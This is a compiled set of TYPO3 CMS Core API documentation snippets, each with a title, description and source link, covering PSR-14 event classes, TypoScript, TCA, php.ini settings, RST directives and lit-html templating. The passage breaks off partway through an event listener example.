https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Templating/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\nimport {html, render} from 'lit-html';\n\nconst value = 'World';\nconst target = document.getElementById('target');\nconst template = html`\n   <div @click=\"${(evt: Event): void => { console.log(value); }}\">\n      Hello ${value}!\n   </div>\n`;\nrender(template, target);\n```\n\n----------------------------------------\n\nTITLE: Defining ProcessFileListActionsEvent Class in TYPO3 File List Module\nDESCRIPTION: This code defines the ProcessFileListActionsEvent class in the TYPO3 File List module namespace. The event is fired to modify icons rendered for file listings and provides methods to access and modify related data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Filelist/ProcessFileListActionsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Filelist\\Event;\n\nclass ProcessFileListActionsEvent\n{\n    public function getResource(): \\TYPO3\\CMS\\Core\\Resource\\ResourceInterface\n    {\n        // Implementation not shown\n    }\n\n    public function isFile(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getActionItems(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setActionItems(array $actionItems)\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFlexFormDataStructureIdentifierInitializedEvent Class in PHP\nDESCRIPTION: This class allows listeners to modify or enhance the data structure identifier used for a given TCA flex field. It provides methods to access and modify the field TCA, table name, field name, database row, and the identifier itself.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nphp:class:: AfterFlexFormDataStructureIdentifierInitializedEvent\n```\n\n----------------------------------------\n\nTITLE: Referencing DataHandler Database Path\nDESCRIPTION: PHP global array path reference showing where DataHandler processes TCA-specific options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Introduction/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']\n```\n\n----------------------------------------\n\nTITLE: Referencing FileType Enum in PHP\nDESCRIPTION: Shows the PHP namespace and class for the FileType enum which defines the integer values used in the sys_file.type field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Database.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\FileType\n```\n\n----------------------------------------\n\nTITLE: Demonstrating TYPO3 Namespace Schema\nDESCRIPTION: Shows the general structure of namespaces in TYPO3 following the vendor/package/category pattern.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n\\{VendorName}\\{PackageName}\\({CategoryName}\\)*{ClassName}\n```\n\n----------------------------------------\n\nTITLE: Configuring PHP.ini for TYPO3 CMS\nDESCRIPTION: Essential PHP.ini settings for TYPO3 CMS, including memory limit, execution time, input variables, and PCRE JIT compilation. These settings are crucial for optimal performance and functionality of TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/SystemRequirements/PHP.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: ini\nCODE:\n```\n; memory_limit >= 256MB\nmemory_limit=256M\n\n; max_execution_time >= 240 seconds\nmax_execution_time=240\n\n; max_input_vars >= 1500\nmax_input_vars=1500\n\n; PHP JIT compiler must be activated. Needed for proper Fluid parsing\npcre.jit=1\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive for MFA Provider Selection Screenshot\nDESCRIPTION: RST directive to include and format a screenshot of the TYPO3 MFA provider selection interface. The image is automatically generated by the TYPO3 Screenshots project and includes shadow styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Authentication/MfaSelectProvider.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Authentication/MfaSelectProvider.png\n   :class: with-shadow\n\n   Select a MFA provider screen\n```\n\n----------------------------------------\n\nTITLE: Creating RST Reference Label for Backend Users Section\nDESCRIPTION: This RST directive creates a reference label for the Backend Users section in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  _user-management-backend-users:\n```\n\n----------------------------------------\n\nTITLE: Configuring Table of Contents for Persistence Events in reStructuredText\nDESCRIPTION: This snippet sets up a table of contents for Persistence events documentation using reStructuredText directives. It includes all files in the current directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Persistence/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Configuring Extension Backend Modules with TypoScript\nDESCRIPTION: Shows the TypoScript paths used to configure backend modules for TYPO3 extensions. Configuration can target specific plugins or apply to all modules of an extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleTypoScript.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmodule.tx_<lowercaseextensionname>_<lowercasepluginname>\n```\n\nLANGUAGE: typoscript\nCODE:\n```\nmodule.tx_<lowercaseextensionname>\n```\n\n----------------------------------------\n\nTITLE: Setting up RST Document Structure for TYPO3 Localization API Documentation\nDESCRIPTION: Configures a reStructuredText (RST) document for the TYPO3 Localization API documentation. Includes essential RST directives for formatting, indexing, and creating a table of contents that automatically incorporates all files in the directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: RST\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index::\n   pair: Localization; API\n\n================\nLocalization API\n================\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: TypoScript Setup for Data Processing\nDESCRIPTION: TypoScript configuration for CSV data processing in content elements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_8\n\nLANGUAGE: typoscript\nCODE:\n```\ntt_content.myextension_newcontentcsv =< lib.contentElement\ntt_content.myextension_newcontentcsv {\n    templateName = DataProcCsv\n    dataProcessing {\n        10 = TYPO3\\CMS\\Frontend\\DataProcessing\\CommaSeparatedValueProcessor\n        10 {\n            fieldName = bodytext\n            fieldDelimiter = ,\n            fieldEnclosure = \\\"\n            maximumColumns = 2\n            as = myTable\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Moving Record in TYPO3 Workspace\nDESCRIPTION: CSV table showing the database representation of creating a new record and then moving it to a different page within a TYPO3 workspace. It illustrates how the target page ID is directly used in the placeholder record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n...,...,...,...,...,...,...,...,...,...,...\n25,30,0,512,1,0,1,0,0,Article #4 new & moved\n26,-1,0,512,1,25,-1,0,0,Article #4 new & moved\n```\n\n----------------------------------------\n\nTITLE: Creating ZIP Archive of Existing TYPO3 Extension Translations\nDESCRIPTION: This bash command creates a ZIP archive containing all existing translation files for a TYPO3 extension. The archive can be used for a one-time import of translations into Crowdin.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin/ExtensionIntegration.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nzip translations.zip Resources/Private/Language/*.*.xlf\n```\n\n----------------------------------------\n\nTITLE: Mapping Record Types to Extbase Models\nDESCRIPTION: Illustrates how to configure record types within the Classes.php file. It allows mapping specific record types to their respective models and defines subclasses for hierarchical domain objects, thereby enabling diverse object handling from a single repository.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Persistence.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    \\MyVendor\\MyExtension\\Domain\\Model\\Something::class => [\n        'tableName' => 'tx_myextension_domain_model_party',\n        'recordType' => 'something',\n        'subclasses' => [\n            'oneSubClass' => \\MyVendor\\MyExtension\\Domain\\Model\\SubClass1::class,\n            'anotherSubClass' => MyVendor\\MyExtension\\Domain\\Model\\SubClass2::class,\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Referencing removed AfterExtensionStaticDatabaseContentHasBeenImportedEvent PHP class path\nDESCRIPTION: The fully qualified PHP namespace for the removed PSR-14 event that was previously used to handle post-processing after extension static database content was imported.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/ExtensionManager/AfterExtensionStaticDatabaseContentHasBeenImportedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Extensionmanager\\Event\\AfterExtensionStaticDatabaseContentHasBeenImportedEvent\n```\n\n----------------------------------------\n\nTITLE: Many-to-Many Relation Tables in TYPO3\nDESCRIPTION: Examples of tables used for storing many-to-many relationships in TYPO3, including the category-record relation table and the file reference table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/DatabaseStructure/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nsys_category_record_mm\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_file_reference\n```\n\n----------------------------------------\n\nTITLE: Defining settings.php File\nDESCRIPTION: This snippet outlines the definition of the settings.php file, including its path and regex for matching. It is crucial for configuring database connection details and other important system settings in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationFiles.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  typo3:file:: settings.php\n    :scope: project\n    :regex: /^(.*\\/config\\/system\\/settings\\.php|.*\\/typo3conf\\/system\\/settings\\.php|settings\\.php)$/\n    :composerPath: config/system/\n    :classicPath: typo3conf/system/\n    :shortDescription: Contains system wide settings, managed by the Admin Tools / Install Tool.\n\n    The most important configuration file is\n    :file:`settings.php`. It contains local settings of the\n    main global PHP array :php:`$GLOBALS['TYPO3_CONF_VARS']`, crucial settings\n    like database connect credentials are in here. The file is managed by the\n    modules in section :guilabel:`Admin Tools`.\n```\n\n----------------------------------------\n\nTITLE: Advanced RecordLinkHandler TypoScript Configuration\nDESCRIPTION: This TypoScript configuration demonstrates a more advanced setup for the RecordLinkHandler. It includes options for forcing links and configuring typolink parameters with dynamic field data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/RecordLinkHandler.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.anIdentifier {\n    forceLink = 0\n\n    typolink {\n        parameter = 123\n        additionalParams.data = field:uid\n        additionalParams.wrap = &tx_example_pi1[item]=|\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Sendmail Transport in TYPO3\nDESCRIPTION: Configuration for sending emails using the local sendmail command in TYPO3, specifying the transport method and the command to execute with proper parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport'] = 'sendmail';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_sendmail_command'] = '/usr/sbin/sendmail -bs';\n```\n\n----------------------------------------\n\nTITLE: Including ReStructuredText Image File in TYPO3 Documentation\nDESCRIPTION: This directive includes an image file, likely a screenshot of the TYPO3 backend showing the File Storage Access tab, to illustrate the configuration of processed files folders.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Folders.rst#2025-04-16_snippet_5\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  include:: /Images/AutomaticScreenshots/Fal/AdministrationFileStorageAccessTab.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Configuring TypoScript in TYPO3\nDESCRIPTION: This snippet demonstrates the basic setup of a TypoScript identifier, assigning it a text value within a TYPO3 extension. The example highlights the syntax for defining TypoScript objects and setting their properties. Ensure proper TypoScript parsing by closing all braces correctly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/CodeBlockInvalidClosingBrace.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier = TEXT\nmyIdentifier {\n   value = bar }\n```\n\n----------------------------------------\n\nTITLE: Including TYPO3 Documentation Header in reStructuredText\nDESCRIPTION: This snippet includes a standard TYPO3 documentation header file and sets a reference label for the current page.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. _services-using-services:\n```\n\n----------------------------------------\n\nTITLE: Fetching Language Packs via Command Line in Composer-based TYPO3 Installation\nDESCRIPTION: Command to update language packs through the command line interface in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 language:update\n```\n\n----------------------------------------\n\nTITLE: Conditions and Iteration with lit-html\nDESCRIPTION: Shows how to implement conditional rendering and iterate over arrays using lit-html directives and template literals.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Templating/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport {html, render} from 'lit-html';\nimport {classMap} from 'lit-html/directives/class-map.js';\n\nconst items = ['a', 'b', 'c']\nconst classes = { list: true };\nconst target = document.getElementById('target');\nconst template = html`\n   <ul class=${classMap(classes)}\">\n   ${items.map((item: string, index: number): string => {\n      return html`<li>#${index+1}: ${item}</li>`\n   })}\n   </ul>\n`;\nrender(template, target);\n```\n\nLANGUAGE: html\nCODE:\n```\n<ul class=\"list\">\n   <li>#1: a</li>\n   <li>#2: b</li>\n   <li>#3: c</li>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: Implementing Middleware for Multilingual Season List in TYPO3 CMS\nDESCRIPTION: This code snippet defines a middleware class HaikuSeasonList that handles requests for a list of seasons with their translations. It uses the LanguageServiceFactory, ResponseFactoryInterface, and StreamFactoryInterface dependencies. The middleware responds to specific URL patterns to provide translations based on the configured site language.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/_php/_LanguageServiceFactoryDI.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseFactoryInterface;\nuse Psr\\Http\\Message\\StreamFactoryInterface;\nuse TYPO3\\CMS\\Core\\Localization\\LanguageServiceFactory;\n\n/**\n * This middleware can be used to retrieve a list of seasons with their according translation.\n * To get the correct translation the URL must be within a base path defined in site\n * handling. Some examples:\n * \"/en/haiku-season-list.json\" for English translation (if /en is the configured base path)\n * \"/de/haiku-season-list.json\" for German translation (if /de is the configured base path)\n * If the base path is not available in the according site the default language will be used.\n */\nfinal readonly class HaikuSeasonList implements MiddlewareInterface\n{\n    public function __construct(\n        private LanguageServiceFactory $languageServiceFactory,\n        private ResponseFactoryInterface $responseFactory,\n        private StreamFactoryInterface $streamFactory,\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA for Tea Domain Model in TYPO3\nDESCRIPTION: This code snippet configures the TCA (TypoScript Configuration Array) for the `tx_tea_domain_model_tea` record. It defines properties such as the record's title, label field (`title`), timestamp fields (`tstamp`, `crdate`), delete flag (`deleted`), default sorting, icon, search fields, enable columns for frontend group access, disable status, start and end times, translation handling, and language settings. This configuration is crucial for managing the Tea domain model within the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/Configuration/TCA/TeaCtrl.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n[\n    'ctrl' => [\n        'title' => 'LLL:EXT:tea/Resources/Private/Language/locallang_db.xlf:tx_tea_domain_model_tea',\n        'label' => 'title',\n        'tstamp' => 'tstamp',\n        'crdate' => 'crdate',\n        'delete' => 'deleted',\n        'default_sortby' => 'title',\n        'iconfile' => 'EXT:tea/Resources/Public/Icons/Record.svg',\n        'searchFields' => 'title, description',\n        'enablecolumns' => [\n            'fe_group' => 'fe_group',\n            'disabled' => 'hidden',\n            'starttime' => 'starttime',\n            'endtime' => 'endtime',\n        ],\n        'transOrigPointerField' => 'l18n_parent',\n        'transOrigDiffSourceField' => 'l18n_diffsource',\n        'languageField' => 'sys_language_uid',\n        'translationSource' => 'l10n_source',\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Including Database Upgrade Wizard Screenshot in RST Documentation\nDESCRIPTION: RST markup for including and displaying a screenshot of the TYPO3 Database Upgrade Wizard interface with shadow styling. The image is automatically generated by the TYPO3 Screenshots project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/DatabaseUpgradeWizard.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/DatabaseUpgradeWizard.png\n   :class: with-shadow\n\n   The Upgrade Wizard indicating that the database needs updates\n```\n\n----------------------------------------\n\nTITLE: Setting up table of contents for DataHandling events in TYPO3 Core documentation\nDESCRIPTION: This snippet configures a table of contents for the DataHandling events documentation page, using reStructuredText directives to include all child pages in the directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/DataHandling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Implementing getUrl Method in ModifyUrlForCanonicalTagEvent Class\nDESCRIPTION: This method retrieves the current canonical URL. It returns a string representing the URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Seo/ModifyUrlForCanonicalTagEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getUrl()\n        :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Using AfterFileMarkedAsMissingEvent Reference\nDESCRIPTION: Shows the PHP namespace reference for the AfterFileMarkedAsMissingEvent PSR-14 event that triggers when files are marked as missing in the sys_file table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileMarkedAsMissingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFileMarkedAsMissingEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring PHP.ini for File Uploads in TYPO3 CMS\nDESCRIPTION: PHP.ini settings to control the maximum upload file size in TYPO3 CMS. These settings allow uploads of files up to 10 MB in size.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/SystemRequirements/PHP.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: ini\nCODE:\n```\n; To allow uploads of a maximum of 10 MB\npost_max_size = 10M\nupload_max_filesize = 10M\n```\n\n----------------------------------------\n\nTITLE: RST Table of Contents\nDESCRIPTION: Generates a local table of contents with depth 1\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendLanguages.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n..  contents:: **Table of Contents**\n    :depth: 1\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Abstract Function Declaration\nDESCRIPTION: Shows the correct placement of the abstract keyword after the visibility modifier in function declarations\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_25\n\nLANGUAGE: php\nCODE:\n```\nprotected abstract function render();\n```\n\n----------------------------------------\n\nTITLE: Simple Acceptance Test for TYPO3 Frontend\nDESCRIPTION: A PHP class for a Codeception acceptance test that verifies if the frontend page of the TYPO3 site is rendered correctly. The test navigates to the homepage, performs a click action, and checks for specific text to ensure correct page rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\nnamespace Bk2k\\SiteIntroduction\\Tests\\Acceptance\\Frontend;\nuse Bk2k\\SiteIntroduction\\Tests\\Acceptance\\Support\\AcceptanceTester;\nclass FrontendPagesCest\n{\n    /**\n     * @param AcceptanceTester $I\n     */\n    public function firstPageIsRendered(AcceptanceTester $I)\n    {\n        $I->amOnPage('/');\n        $I->see('Open source, enterprise CMS delivering  content-rich digital experiences on any channel,  any device, in any language');\n        $I->click('Customize');\n        $I->see('Incredible flexible');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Non-Extbase Plugin Configuration\nDESCRIPTION: Example of registering and configuring a non-Extbase plugin with associated TypoScript configuration\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility;\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\n\n$extensionKey = 'Examples';\n$pluginName = 'HtmlParser';\n$pluginTitle = 'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:htmlparser_plugin_title';\n\n$pluginSignature = ExtensionUtility::registerPlugin(\n    $extensionKey,\n    $pluginName,\n    $pluginTitle\n);\n```\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_examples_pi1 {\n  settings.pageId = 42\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Field TCA in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the full TCA of the currently handled field with type=flex set.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getFieldTca()\n    :returns: `array`\n\n    Returns the full TCA of the currently handled field, having\n    `type=flex` set.\n```\n\n----------------------------------------\n\nTITLE: Inline Notation for Nested HTML Tags in Fluid\nDESCRIPTION: Demonstrates how inline notation can be cleaner when ViewHelpers are used within HTML attributes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_20\n\nLANGUAGE: html\nCODE:\n```\n<!-- tag based notation -->\n<span title=\"<f:translate key='LLL:EXT:core/Resources/Private/Language/locallang_misc.xlf:bookmark_inactive'/>\"/>\n\n<-- inline notation -->\n<span title=\"{f:translate(key: 'LLL:EXT:core/Resources/Private/Language/locallang_misc.xlf:bookmark_inactive')}\">\n```\n\n----------------------------------------\n\nTITLE: TypoScript HTML Code Assignment\nDESCRIPTION: This snippet shows how to embed HTML code within a TypoScript TEXT object using a multiline assignment. The HTML code is directly assigned as the value of the TEXT object, allowing for dynamic generation of HTML content. Note that the HTML will be rendered as-is.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorMultiLine.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier= TEXT\nmyIdentifier.value (\n   <p class=\\\"warning\\\">\n      This is HTML code.\n   </p>\n)\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for Password Policy Events in reStructuredText\nDESCRIPTION: This snippet defines a table of contents for password policy-related events using reStructuredText directives. It includes all files in the current directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/PasswordPolicy/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Feature Toggles Configuration in settings.php\nDESCRIPTION: Shows how the feature toggle configuration appears in the settings.php file after being set through the Admin Tools interface. This example enables the redirects.hitCount feature.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FeatureToggleApi/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n'SYS' => [\n    'features' => [\n        'redirects.hitCount' => true,\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Defining AfterRecordLanguageOverlayEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the AfterRecordLanguageOverlayEvent class in the TYPO3\\CMS\\Core\\Domain\\Event namespace. The class provides methods to interact with the record translation process, including accessing the original record, language aspects, and localized record details.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterRecordLanguageOverlayEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Domain\\Event;\n\nclass AfterRecordLanguageOverlayEvent\n{\n    public function getTable(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getRecord(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getLanguageAspect(): \\TYPO3\\CMS\\Core\\Context\\LanguageAspect\n    {\n        // Implementation not shown\n    }\n\n    public function setLocalizedRecord(?array $localizedRecord): void\n    {\n        // Implementation not shown\n    }\n\n    public function getLocalizedRecord(): ?array\n    {\n        // Implementation not shown\n    }\n\n    public function overlayingWasAttempted(): bool\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a ModifyValidatorTaskEmailEvent Listener in TYPO3\nDESCRIPTION: This example demonstrates how to implement an event listener for the ModifyValidatorTaskEmailEvent in TYPO3. The listener modifies the FluidEmail object to set custom email recipients and assigns additional template variables based on the linkvalidator task results.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/ModifyValidatorTaskEmailEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\n\nnamespace MyVendor\\MyExtension\\Linkvalidator\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Mail\\FluidEmail;\nuse TYPO3\\CMS\\Linkvalidator\\Event\\ModifyValidatorTaskEmailEvent;\nuse TYPO3\\CMS\\Linkvalidator\\Result\\LinkAnalyzerResult;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyValidatorTaskEmailEvent $event): void\n    {\n        $modTsConfig = $event->getModTSconfig();\n        $fluidEmail = $event->getFluidEmail();\n        $linkAnalyzerResult = $event->getLinkAnalyzerResult();\n\n        $fluidEmail\n            ->to('admin@example.org')\n            ->assign('customData', [\n                'customKey' => 'customValue'\n            ]);\n\n        $this->addCustomLinkData($linkAnalyzerResult);\n    }\n\n    protected function addCustomLinkData(LinkAnalyzerResult $linkAnalyzerResult): 